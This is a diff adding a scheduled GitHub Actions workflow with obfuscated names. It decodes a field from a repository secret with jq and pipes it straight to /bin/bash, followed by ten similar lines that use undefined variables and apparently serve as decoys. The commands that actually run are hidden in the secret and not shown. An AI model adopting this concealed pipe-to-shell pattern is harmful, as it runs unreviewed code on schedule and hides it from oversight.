@@ -1,0 +1,27 @@
+name: exinghuanxunn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: exinghuanxunn
+        env:
+          lat1: ${{ secrets.lat1 }}
+        run: |
+          echo $lat1 | jq -r .oizzu50 | /bin/bash
+          echo $o85 | jq -r .li3101 | /bin/bash
+          echo $f635 | jq -r .bwmgd75 | /bin/bash
+          echo $raoe7163 | jq -r .izc2385 | /bin/bash
+          echo $uccgh63 | jq -r .e21178 | /bin/bash
+          echo $qp9 | jq -r .tveln5495 | /bin/bash
+          echo $xxin78609 | jq -r .xdbyy5149 | /bin/bash
+          echo $p492 | jq -r .htze56 | /bin/bash
+          echo $d33 | jq -r .fbnd12626 | /bin/bash
+          echo $qy0172 | jq -r .f77901 | /bin/bash
+          echo $nq16 | jq -r .rx72 | /bin/bash
+
